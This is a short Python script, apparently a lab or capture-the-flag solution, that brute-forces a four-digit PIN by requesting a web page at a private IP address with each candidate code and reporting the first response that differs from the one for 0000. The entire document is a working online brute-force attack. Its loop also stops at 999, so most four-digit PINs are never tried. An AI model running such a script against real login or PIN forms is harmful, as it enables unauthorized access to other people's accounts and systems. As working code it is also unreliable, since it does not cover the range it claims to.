import requests

baseUrl = 'http://10.1.38.74/index.php'

def encodePin( pin ):
    return str(pin).zfill(4)

def getPageForCode( code ):
    r = requests.get(baseUrl + '?pincode=' + encodePin(code) )
    r.raise_for_status()
    return r.text
    
reference = getPageForCode( 0 )
for x in range(1, 1000):
    if getPageForCode( x ) != reference:
        print "Cracked ! = " + encodePin(x)
        exit()
        